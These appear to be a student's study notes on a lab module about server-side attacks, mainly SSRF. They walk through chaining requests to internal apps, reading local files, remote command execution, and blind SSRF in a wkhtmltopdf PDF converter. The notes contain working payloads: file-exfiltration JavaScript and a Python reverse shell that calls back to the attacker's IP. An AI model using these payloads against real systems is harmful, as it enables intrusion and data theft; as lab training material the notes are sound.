# Intro

## Intro

Server-Side attacks target the application provided by a server. An excellent example of these attacks are Cross-Site Request Forgeries (CSRF) and Server-side Request Forgeries (SSRF).

At a high level, CSRF attacks may utilize other client side -attacks like XSS vulnerabilities to perform requests to a web application that a victim has already been authenticated to. This allows the attacker to perform actions as the authorized user, such as changing their password to something the attacker would know or performing any unwarranted action as the victim. 

This module covers:
Abusing Intermediary Applications
Server-Side Request Forgery (SSRF)
Server-Side Includes Injection (SSI)
Edge-Side Includes Injection (ESI)
Server-Side Template Injection (SSTI)
Extensible Stylesheet Language Transformations Server-Side Injection (XSLT)

# Abusing Intermediary Applications

## AJP Proxy

AJP (or JK) is a wire protocol specifically designed to let Tomcat work with Apache. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible but proxy the request to Tomcat for Tomcat-related content.

If we come across open AJP proxy ports (8009 TCP), we may be able to use them to access the hidden Apache Tomcat manager behind it. We can configure our own Nginx or Apache Server with AJP modules to interact with it and access the underlying application.

## Nginx Reverse Proxy & AJP

When we come across an open 8009 TCP port we can use Nginx with ajp_module to access the Tomcat manager.

We can do this by compiling the Nginx source and adding the required module as follows:
- Download the Nginx source code
- Download the required module
- Compile Nginx source code with the ajp_module.
- Create a configuration file pointing to the AJP Port

This section covers how to do this, but I could not get this work locally, so instead I used the pwn box.

The question in this section is:
Replicate the steps shown in this section to connect to the above server's "hidden" Tomcat page through the AJP proxy, then write the Tomcat version as your answer. Remember that the port you will see next to "Target:" will be the AJP proxy port. Answer format: X.X.XX 

Getting this answer was as easy as running the command son this page to install nginx and configure the port to aim to the correct place. The only trip up was I did not see the note saying to use the server port, not port 8009. After fixing that it worked perfectly.

## Apache Reverse Proxy & AJP

This section covers how to use Apache to do the same thing as the previous section.

It says these are the commands needed:
```
sudo apt install libapache2-mod-jk
sudo a2enmod proxy_ajp
sudo a2enmod proxy_http
export TARGET="<TARGET_IP>"
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
sudo systemctl start apache2
``` 

Unfortunatly it seems like mod_jk is not available for Mac, so this also had to be done on the pwnbox.

There is no question in this section.

# Server Side Request Forgery (SSRF)

## Server Side Request Forgery (SSRF) Overview

SSRF attacks allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. The result of SSRF can lead to:
```
    Interacting with known internal systems
    Discovering internal services via port scans
    Disclosing local/sensitive data
    Including files in the target application
    Leaking NetNTLM hashes using UNC Paths (Windows)
    Achieving remote code execution
```

When hunting SSRF vulnerablilities we should look for:
```
    Parts of HTTP requests, including URLs
    File imports such as HTML, PDFs, images, etc.
    Remote server connections to fetch data
    API specification imports
    Dashboards including ping and similar functionalities to check server statuses
```

## SSRF Exploitation Example

After connecting to the VPN, 

Running `nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>` gets the open ports on the IP. We find that there are only 3 open ports.

Specifically, 22/tcp, 80/tcp, and 8080/tcp.

If we run `curl -i -s http://<TARGET IP>` to see the headers we can see that request gets redirected to /load?q=index.html, meaning the q parameter fetches the resource index.html. Lets follow that redirect to see if we can get more information.

`curl -i -s -L http://<TARGET IP>`

What we see is that it returns a page this time, and it has a comment mentioning an internal resource that gets returned from the q parameter. If we can confirm an SSRF vuln on this parameter we may be able to access this internal resource.

To test this, we can start a netcat listener on 8081 like:
`nc -nvlp 8081`

Then in another terminal we can run:
`curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8081"`

To get our TUN adapter IP, we can look in the output of open vpn for this line:
`/sbin/ifconfig utun3 10.10.15.33 10.10.15.33 netmask 255.255.254.0 mtu 1500 up`

The result of running this shows that they are making requests using the Python-urllib. If we read the docs for this library we see that it supports file, http, and ftp schemas. So we can issue HTTP request, and read local files via the file schema, and remote files using ftp.

To test this:

Create a file called Index.html with:
``` html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

Then in that same directory, start a server using `python3 -m http.server 9090`

Inside that the same directory start and ftp server using:
```
sudo pip3 install twisted
sudo python3 -m twisted ftp -p 21 -r .
```

Then we can retrieve index.html through ftp schema with:

`curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"`

If that works, we can try to retrieve files like:
`curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"`

Keep in mind that fetching remote HTML files can lead to Reflected XSS.

Remember we only have two open ports on the target server, however, there is a chance internal apps are listening to ports on localhost. To check this, we can use ffuf to enumerate these web apps by:

Generate a wordlist containing all possible ports:
`for port in {1..65535};do echo $port >> ports.txt;done`

Issue a cURL request to a random port to get the response size of a request for a non-existent service.
`curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"` 
For me this was 30.

Then we can use ffuf to discard responses with that size.
`ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30`

This shows a valid response on port 5000. If we run a regular curl on this one it returns a valid web page.

Up to this point we have learned how to reach the internal apps, and use different schemas to load local files through SSRF. But our ultimate goal is to achieve remote code execution on an internal host. 

Remember we uncovered that both applications load resources in the same way (using the q paramter).

If we run `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"` we can see it returns the same as the original request when using -L

Now lets discover any web apps lisening in localhost. Let's try to issue a request to a random port to indetify how closed ports look.

`curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"`

For me the closed port has size 98 because it actually rendered some web content. However, in the output it returned an Error number and FFUF allows us to filter with a regular expression. So we can run the same test we did before on the ports filtering on this Errno like:

`ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'`

Running this returns another application listening on port 5000. Curling that url returns a list of files.

`curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"`

```
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
```

So far we have done a lot to get information on this web app, now its time to uncover the source code to see if we can achieve remote code execution.

We can request the /proc/self/environ file, where our current path should be under PWD.

`curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -`

The resulting html is:
``` html
<html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3</a></body></html>
```

In it, we see the pwd variable is /app.

So lets try to read the internal_local.py file:
`curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"`` 

This code clearly takes a /runme?x=<cmd> parameter. And it just runs the code.

Running `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"` returns we are root.

However, if we try to run commands with a space it fails, so we have to encode the URL. But we have to do this 3 times because we pass it through 3 different web apps.

To do this we could use `https://www.urlencoder.org/` or we can use jq on the terminal.

Running something like `echo "encode me" | jq -sRr @uri` will encode our string.

Then we can run a function like this to get it to work:
``` Bash
function rce() {
        while true; do
                echo -n "# "; read cmd
                ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
                curl -s -o - "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
                echo ""
                done
}
```

With this we have achieved remote code execution.

The question of this section is:
Replicate what you learned in this section to gain code execution on the spawned target, then look for the flag in the root directory and submit the contents as your answer. 

Getting this with our remote code execution was as easy as running ls on /root and then cat /root/flag.txt

## Blind SSRF

Server-Side Request Forgery vulnerabilities can be "blind." In these cases, even though the request is processed, we can't see the backend server's response. For this reason, blind SSRF vulnerabilities are more difficult to detect and exploit.

We can detect blind SSRF vulnerabilities via out-of-band techniques, making the server issue a request to an external service under our control. To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:
```
    Burp Collaborator (Part of Burp Suite professional. Not Available in the community edition)
    http://pingb.in
```
Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.

## Blind SSRF Explotation Example

Target IP: 10.129.201.238

In this section we have an application that allows us to upload html and convert it to PDF.

If we upload any form of html, we always get the same response. So we don't have direct SSRF, but we can still check for Blind SSRF.

Lets create an html file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability. For ease of use we will use a netcat on port 9090 for testing. But we could use Burp Collaborato or a Pingb.in URL as well.

``` html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://10.10.15.33:9090/x?=viaimgtag">
</body>
</html>
```

We are using the UTUN value from the vpn again here.

Then we can run `nc -nlvp 9090` and upload our file. We see a response which tells us this is vulnerable to blind SSRF.

The response is:
```
Connection from 10.129.201.238:49380
GET /x?=viaimgtag HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.15.33:9090
```

If we inspect the user agent, we notice wkhtmltopdf. If we read the [docs](https://wkhtmltopdf.org/downloads.html) for this we see:
```
Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.
```

So we can execute Javascript in wkhtmltopdf. Lets try to read a local file with the following html.
``` html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://10.10.15.33:9090/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```

Note in this code we use to XMLHttpRequests Objects. One is to read the file, the other is to send it to our server.
Also we use btoa function to send the data encoded in base64.

Once we start another netcat listener, and upload this file, we get:
`cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=`

If we decode it, we get all the contents of /etc/passwd

In the previous section, we exploited an internal applocation through SSRF and executed remote commands on the target server. The same internal app (internal.app.local) exists in the current scenario. Lets compromise it again, but this time by creating an HTML document with a valid payload for exploiting the local application listening on internal.app.local.

We can use the following reverse shell to upload.
`export RHOST="10.10.15.33";export RPORT="9090";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`

It mentions in this section its easy to figure out python is installed once we get remote code execution. I believe this is in reference to our previous achieval of this. But I think that just saying this is confusing and doesn't really teach us anything.

We do have to url encode the reverse shell above like we did last time. And since this is going through 2 apps, we have to pass it jq twice like `| jq -sRr @uri | jq -sRr @uri` 

That looks like:
`export%2520RHOST%253D10.10.15.33%253Bexport%2520RPORT%253D9090%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528RHOST%2529%252Cint%2528os.getenv%2528RPORT%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%252Fbin%252Fsh%2529%2527%250A%0A`

Then we need to create an html file that leverages this request:
``` html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.15.33%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true);
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

Then we can start the netcat listener again and upload the file, then we should get a working reverse shell.

The question in this section is:
The target is vulnerable to blind SSRF. Leverage this blind SSRF vulnerability to interact with internal.app.local and achieve remote code execution against the internal service listening on port 5000, as you did in the previous section. Submit the kernel release number as your answer (Answer format: X.X.X-XX) 

Once we get the reverse shell uploaded, all we have to do is run uname -a:
Linux f53c1f1e6368 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 GNU/Linux

## Time Based SSRF

We can also determine the existence of an SSRF vulnerability by observing time differences in responses. This method is also helpful for discovering internal services.

Let us submit the following document to the PDF application of the previous section and observe the response time.

``` html
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://blah.nonexistent.com">
    </body>
</html>
```

We can see the service took 10 seconds to respond to the request. If we submit a valid URL inside the HTML document, it will take less time to respond. Remember that internal.app.local was a valid internal application (that we could access through SSRF in the previous section).

In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.

# Server Side Includes (SSI) Injection

## Server Side Includes Overview

## SSI Injection Explotation Example

# Edge Sides Includes (ESI) Injection

## Edge-Side Includes (ESI) 

# Server-Side Template Injections

## Intro to Template Engines

## SSTI Indentificaiton

## SSTI Exploitation Example 1

## SSTI Exploitation Example 2

## SSTI Exploitation Example 3

# Extensible Stylesheet Language Transformations Server-Side Injections

## Attacking XSLT

# Skills Assessment

## Server-Side Attacks


